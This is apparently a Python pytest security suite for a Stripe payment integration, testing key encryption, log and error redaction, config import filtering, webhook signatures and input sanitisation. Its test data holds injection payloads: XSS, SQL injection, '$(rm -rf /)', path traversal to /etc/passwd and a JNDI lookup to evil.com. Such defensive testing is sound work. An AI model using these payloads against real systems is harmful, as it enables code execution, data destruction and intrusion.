#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
セキュリティテストスイート
Stripe統合におけるセキュリティ関連のテスト
"""

import pytest
import os
import tempfile
import json
import base64
import re
from unittest.mock import Mock, patch, mock_open
import sys

# パスの設定
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from config_manager import ConfigManager
    from stripe_utils import validate_stripe_configuration
except ImportError as e:
    pytest.skip(f"Required modules not available: {e}", allow_module_level=True)


class TestAPIKeySecurity:
    """APIキーセキュリティテストクラス"""
    
    def test_api_key_encryption(self):
        """APIキー暗号化テスト"""
        config_manager = ConfigManager()
        
        # テスト用のAPIキー
        original_key = "sk_test_1234567890abcdefghijklmnopqrstuvwxyz"
        
        # 暗号化
        encrypted_key = config_manager._encrypt_api_key(original_key)
        
        # 暗号化されていることを確認
        assert encrypted_key != original_key
        assert len(encrypted_key) > len(original_key)  # Base64エンコードで長くなる
        
        # 復号化
        decrypted_key = config_manager._decrypt_api_key(encrypted_key)
        assert decrypted_key == original_key
    
    def test_api_key_format_validation(self):
        """APIキー形式検証テスト"""
        config_manager = ConfigManager()
        
        # 正常なAPIキー形式
        valid_test_cases = [
            ('test', 'sk_test_1234567890abcdef', 'stripe_secret_key_test'),
            ('test', 'pk_test_1234567890abcdef', 'stripe_publishable_key_test'),
            ('live', 'sk_live_1234567890abcdef', 'stripe_secret_key_live'),
            ('live', 'pk_live_1234567890abcdef', 'stripe_publishable_key_live'),
        ]
        
        for mode, key, key_type in valid_test_cases:
            config_manager.config.update({
                'stripe_mode': mode,
                key_type: key
            })
            
            result = config_manager.validate_stripe_config()
            # この場合は他のキーが不足しているのでvalidはFalseだが、
            # 形式エラーは出ないはず
            format_errors = [error for error in result['errors'] 
                           if '形式が' in error and key_type.replace('stripe_', '').replace('_test', '').replace('_live', '') in error]
            assert len(format_errors) == 0
    
    def test_invalid_api_key_format_detection(self):
        """無効なAPIキー形式検出テスト"""
        config_manager = ConfigManager()
        
        # 無効なAPIキー形式
        invalid_test_cases = [
            ('test', 'sk_live_wrongmode', 'stripe_secret_key_test'),  # モード不一致
            ('test', 'invalid_key_format', 'stripe_secret_key_test'),  # 完全に無効
            ('live', 'pk_test_wrongmode', 'stripe_publishable_key_live'),  # モード不一致
            ('live', '', 'stripe_secret_key_live'),  # 空のキー
        ]
        
        for mode, key, key_type in invalid_test_cases:
            config_manager.config.update({
                'stripe_mode': mode,
                key_type: key,
                # 他の必須キーも設定してフォーマットエラーのみをテスト
                'stripe_secret_key_test': 'sk_test_dummy' if mode == 'test' else '',
                'stripe_publishable_key_test': 'pk_test_dummy' if mode == 'test' else '',
                'stripe_secret_key_live': 'sk_live_dummy' if mode == 'live' else '',
                'stripe_publishable_key_live': 'pk_live_dummy' if mode == 'live' else '',
            })
            
            result = config_manager.validate_stripe_config()
            assert not result['valid']  # 無効なキーがある場合はvalidがFalse
    
    def test_api_key_not_in_logs(self):
        """APIキーがログに出力されないことを確認"""
        config_manager = ConfigManager()
        
        test_secret_key = "sk_test_sensitive_key_should_not_appear_in_logs"
        
        # ログキャプチャ用のモック
        with patch('logging.Logger.info') as mock_log_info, \
             patch('logging.Logger.error') as mock_log_error, \
             patch('logging.Logger.warning') as mock_log_warning:
            
            # 暗号化処理でAPIキーがログに出ないことを確認
            config_manager._encrypt_api_key(test_secret_key)
            
            # 全てのログ呼び出しをチェック
            all_log_calls = (mock_log_info.call_args_list + 
                           mock_log_error.call_args_list + 
                           mock_log_warning.call_args_list)
            
            for call_args in all_log_calls:
                log_message = str(call_args)
                assert test_secret_key not in log_message
    
    def test_encryption_key_file_permissions(self):
        """暗号化キーファイルの権限テスト"""
        config_manager = ConfigManager()
        
        # 暗号化キーを生成
        encryption_key = config_manager.get_encryption_key()
        
        # キーファイルのパス
        key_file_path = os.path.join(
            os.path.dirname(config_manager.config_path), 
            '.encryption_key'
        )
        
        if os.path.exists(key_file_path):
            # ファイル権限を確認 (Unix系システムでのみ)
            if os.name == 'posix':
                file_stat = os.stat(key_file_path)
                file_permissions = oct(file_stat.st_mode)[-3:]
                
                # 600権限（所有者のみ読み書き可能）であることを確認
                assert file_permissions == '600'


class TestConfigurationSecurity:
    """設定セキュリティテストクラス"""
    
    def test_sensitive_data_exclusion_in_export(self):
        """エクスポート時の機密データ除外テスト"""
        config_manager = ConfigManager()
        
        # 機密データを含む設定
        sensitive_config = {
            'stripe_secret_key_test': 'sk_test_sensitive',
            'stripe_secret_key_live': 'sk_live_sensitive',
            'stripe_webhook_secret': 'whsec_sensitive',
            'paypal_client_secret': 'paypal_sensitive',
            'admin_password': 'admin_sensitive',
            'non_sensitive_data': 'this_is_ok'
        }
        
        config_manager.config.update(sensitive_config)
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as temp_file:
            # 機密データ除外でエクスポート
            result = config_manager.export_config_with_encryption(
                export_path=temp_file.name,
                include_sensitive=False
            )
            
            assert result['success'] is True
            assert len(result['excluded_fields']) > 0
            
            # エクスポートされたファイルを確認
            with open(temp_file.name, 'r') as f:
                exported_data = json.load(f)
            
            exported_config = exported_data.get('config', {})
            
            # 機密データが除外されていることを確認
            sensitive_fields = [
                'stripe_secret_key_test', 'stripe_secret_key_live',
                'stripe_webhook_secret', 'paypal_client_secret', 'admin_password'
            ]
            
            for field in sensitive_fields:
                assert field not in exported_config
            
            # 非機密データは含まれていることを確認
            assert 'non_sensitive_data' in exported_config
            
            # クリーンアップ
            os.unlink(temp_file.name)
    
    def test_config_validation_prevents_injection(self):
        """設定検証がインジェクション攻撃を防ぐテスト"""
        config_manager = ConfigManager()
        
        # 潜在的に危険な設定値
        malicious_configs = [
            {'customer_name': '<script>alert("XSS")</script>'},
            {'description': '"; DROP TABLE users; --'},
            {'amount': '$(rm -rf /)'},
            {'stripe_mode': '../../../etc/passwd'},
            {'webhook_url': 'javascript:alert(1)'}
        ]
        
        for malicious_config in malicious_configs:
            result = config_manager.validate_config_schema(malicious_config)
            
            # 検証プロセスでエラーが発生しないことを確認
            assert isinstance(result, dict)
            assert 'valid' in result
    
    def test_safe_config_import(self):
        """安全な設定インポートテスト"""
        config_manager = ConfigManager()
        
        # 既知のキーのみを含む安全な設定
        safe_config = {
            'stripe_mode': 'test',
            'default_currency': 'JPY',
            'payment_link_expire_days': 30
        }
        
        # 危険なキーを含む設定
        dangerous_config = {
            'stripe_mode': 'test',
            'dangerous_script': '<script>alert("XSS")</script>',
            'system_command': 'rm -rf /',
            '__proto__': {'polluted': True},  # プロトタイプ汚染攻撃
            'constructor': {'name': 'hacked'}
        }
        
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as temp_file:
            # 危険な設定をファイルに書き込み
            json.dump(dangerous_config, temp_file)
            temp_file.flush()
            
            # インポート実行
            result = config_manager.import_config_with_validation(
                import_path=temp_file.name,
                validate_before_save=True
            )
            
            # 既知のキーのみがインポートされていることを確認
            assert result['success'] is True
            imported_fields = result.get('imported_fields', [])
            
            # 危険なキーがインポートされていないことを確認
            dangerous_keys = ['dangerous_script', 'system_command', '__proto__', 'constructor']
            for dangerous_key in dangerous_keys:
                assert dangerous_key not in imported_fields
            
            # 安全なキーはインポートされていることを確認
            assert 'stripe_mode' in imported_fields
            
            # クリーンアップ
            os.unlink(temp_file.name)


class TestWebhookSecurity:
    """Webhookセキュリティテストクラス"""
    
    def test_webhook_signature_validation(self):
        """Webhook署名検証テスト"""
        from stripe_webhook import verify_stripe_webhook_signature
        
        # テスト用のペイロードとシークレット
        test_payload = b'{"id": "evt_test", "type": "checkout.session.completed"}'
        test_secret = 'whsec_test_secret'
        
        # 正しい署名のテスト（モック）
        with patch('stripe.Webhook.construct_event') as mock_construct:
            mock_construct.return_value = True  # 検証成功をシミュレート
            
            result = verify_stripe_webhook_signature(
                payload=test_payload,
                signature='valid_signature',
                secret=test_secret
            )
            
            assert result is True
            mock_construct.assert_called_once()
    
    def test_webhook_signature_validation_failure(self):
        """Webhook署名検証失敗テスト"""
        from stripe_webhook import verify_stripe_webhook_signature
        import stripe.error
        
        test_payload = b'{"id": "evt_test", "type": "checkout.session.completed"}'
        test_secret = 'whsec_test_secret'
        
        # 署名検証失敗のテスト
        with patch('stripe.Webhook.construct_event') as mock_construct:
            mock_construct.side_effect = stripe.error.SignatureVerificationError(
                message="Invalid signature",
                sig_header="invalid_signature"
            )
            
            result = verify_stripe_webhook_signature(
                payload=test_payload,
                signature='invalid_signature',
                secret=test_secret
            )
            
            assert result is False
    
    def test_webhook_payload_validation(self):
        """Webhookペイロード検証テスト"""
        from stripe_webhook import process_payment_completed
        
        # 正常なWebhookペイロード
        valid_payload = {
            'type': 'checkout.session.completed',
            'data': {
                'object': {
                    'object': 'checkout.session',
                    'id': 'cs_test_123',
                    'customer_details': {'email': 'test@example.com'},
                    'amount_total': 100000,  # 1000円（cent単位）
                    'currency': 'jpy',
                    'payment_status': 'paid'
                }
            }
        }
        
        with patch('stripe_webhook.save_payment_completion') as mock_save:
            mock_save.return_value = {'success': True}
            
            with patch('stripe_webhook.send_payment_notification') as mock_notify:
                mock_notify.return_value = {'success': True}
                
                result = process_payment_completed(valid_payload)
                
                assert result['success'] is True
                assert 'payment_info' in result
    
    def test_webhook_malformed_payload_handling(self):
        """Webhook不正形式ペイロードハンドリングテスト"""
        from stripe_webhook import process_payment_completed
        
        # 不正形式のペイロード
        malformed_payloads = [
            {},  # 空のペイロード
            {'type': 'unknown_event'},  # 不明なイベントタイプ
            {'data': None},  # dataがNone
            {'data': {'object': None}},  # objectがNone
            {'data': {'object': {'object': 'unknown_object'}}},  # 未対応オブジェクト
        ]
        
        for payload in malformed_payloads:
            result = process_payment_completed(payload)
            
            # エラーが適切に処理されることを確認
            assert isinstance(result, dict)
            assert 'success' in result


class TestInputValidation:
    """入力検証テストクラス"""
    
    def test_amount_input_validation(self):
        """金額入力検証テスト"""
        from payment_utils import extract_and_validate_payment_data
        
        # 有効な金額形式
        valid_amounts = [
            '1,000', '10000', '¥5,500', '3.14', 1000, 1000.0
        ]
        
        for amount in valid_amounts:
            ocr_data = {'customer_name': 'テスト', 'amount': amount}
            result = extract_and_validate_payment_data(ocr_data)
            
            assert result['valid'] is True
            assert result['amount'] > 0
    
    def test_invalid_amount_rejection(self):
        """無効な金額の拒否テスト"""
        from payment_utils import extract_and_validate_payment_data
        
        # 無効な金額形式
        invalid_amounts = [
            '', None, 'abc', '負の金額', '<script>', 'DROP TABLE'
        ]
        
        for amount in invalid_amounts:
            ocr_data = {'customer_name': 'テスト', 'amount': amount}
            result = extract_and_validate_payment_data(ocr_data)
            
            # 無効な金額でも適切に処理されることを確認
            assert isinstance(result, dict)
    
    def test_customer_name_sanitization(self):
        """顧客名サニタイゼーションテスト"""
        from payment_utils import extract_and_validate_payment_data
        
        # 潜在的に危険な顧客名
        dangerous_names = [
            '<script>alert("XSS")</script>',
            'Robert"; DROP TABLE Students;--',
            '${jndi:ldap://evil.com/a}',
            '\x00\x01\x02',  # null bytes
            'A' * 10000,  # 非常に長い名前
        ]
        
        for name in dangerous_names:
            ocr_data = {'customer_name': name, 'amount': '1000'}
            result = extract_and_validate_payment_data(ocr_data)
            
            # 処理がクラッシュしないことを確認
            assert isinstance(result, dict)
            
            # サニタイゼーションされた顧客名が取得できることを確認
            if result.get('valid'):
                sanitized_name = result.get('customer_name', '')
                assert len(sanitized_name) <= 500  # 長さ制限
                assert '<script>' not in sanitized_name  # HTMLタグ除去
    
    def test_file_upload_validation(self):
        """ファイルアップロード検証テスト"""
        # ファイル拡張子検証（実装があれば）
        allowed_extensions = ['.pdf', '.jpg', '.jpeg', '.png']
        dangerous_extensions = ['.exe', '.php', '.js', '.html', '.svg']
        
        for ext in allowed_extensions:
            filename = f"test{ext}"
            # ファイル名が有効であることを確認
            assert any(filename.endswith(allowed) for allowed in allowed_extensions)
        
        for ext in dangerous_extensions:
            filename = f"malicious{ext}"
            # 危険な拡張子が除外されることを確認
            assert not any(filename.endswith(allowed) for allowed in allowed_extensions)


class TestErrorDisclosure:
    """エラー情報漏洩防止テストクラス"""
    
    def test_error_message_sanitization(self):
        """エラーメッセージのサニタイゼーションテスト"""
        from stripe_utils import create_stripe_payment_link
        
        with patch('stripe.PaymentLink.create') as mock_create:
            # 機密情報を含むエラーメッセージをシミュレート
            sensitive_error = "API key sk_live_sensitive123 is invalid"
            mock_create.side_effect = Exception(sensitive_error)
            
            result = create_stripe_payment_link(
                amount=1000,
                customer_name='エラーテスト',
                description='エラーハンドリングテスト',
                currency='jpy'
            )
            
            assert result['success'] is False
            
            # 機密情報がエラーメッセージに含まれていないことを確認
            error_message = result.get('message', '')
            assert 'sk_live_sensitive123' not in error_message
            assert 'sk_test_' not in error_message
            assert 'sk_live_' not in error_message
    
    def test_stack_trace_not_exposed(self):
        """スタックトレースが外部に露出しないテスト"""
        from stripe_utils import create_stripe_payment_link
        
        with patch('stripe.PaymentLink.create') as mock_create:
            # 内部エラーをシミュレート
            mock_create.side_effect = Exception("Internal server error with sensitive path /home/user/.ssh/id_rsa")
            
            result = create_stripe_payment_link(
                amount=1000,
                customer_name='スタックトレーステスト',
                description='内部エラーテスト',
                currency='jpy'
            )
            
            assert result['success'] is False
            
            # 内部パスやファイル情報が露出していないことを確認
            error_message = result.get('message', '')
            assert '/home/user' not in error_message
            assert '.ssh' not in error_message
            assert 'id_rsa' not in error_message


if __name__ == '__main__':
    # セキュリティテスト実行
    pytest.main([
        __file__,
        '-v',
        '--tb=short',
        '--capture=no'
    ])